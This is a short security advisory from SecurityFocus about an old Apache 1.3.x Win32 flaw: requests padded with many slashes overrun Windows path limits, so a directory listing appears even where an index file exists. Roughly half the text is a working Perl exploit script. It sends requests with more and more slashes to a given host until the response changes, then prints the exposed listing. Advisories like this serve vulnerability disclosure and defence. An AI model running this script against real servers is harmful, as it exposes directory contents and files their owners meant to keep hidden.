source: http://www.securityfocus.com/bid/1284/info

Apache HTTP Server 1.3.x (win32) allows people to get a directory listing of a directory, if it is enabled in the config, even if an index file is present that would normally be displayed instead. This can be achieved by sending a number of "/" characters appended to an HTTP request to the server. (eg: http://www.host.com///////////////////////////////////////////////////////...) When apache calls stat() to check if the index.html (for example) exists, Windows will return an error if the path is too long. Apache incorrectly treats this as if the file does not exist. Different numbers of "/"s are required based on the length of the path to the DocumentRoot. 

#!/usr/bin/perl

use LWP::Simple;
use strict;

my $host = shift() || die "usage:  $ARGV[0] [hostname]";
my $cnt;
my $data;
my $odata;
my $i;

$odata = get("http://$host/");
if ($odata eq "")
{
    die "no response from server:  $host\n";
}
for ($i = 2; $i < 4096; $i++)
{
    print "Trying $i...\n";
    $data = get("http://$host" . ("/" x $i));
    if ($data ne $odata)
    {
        print "/ = $i\n\n$data\n\n";
        exit;
    }
}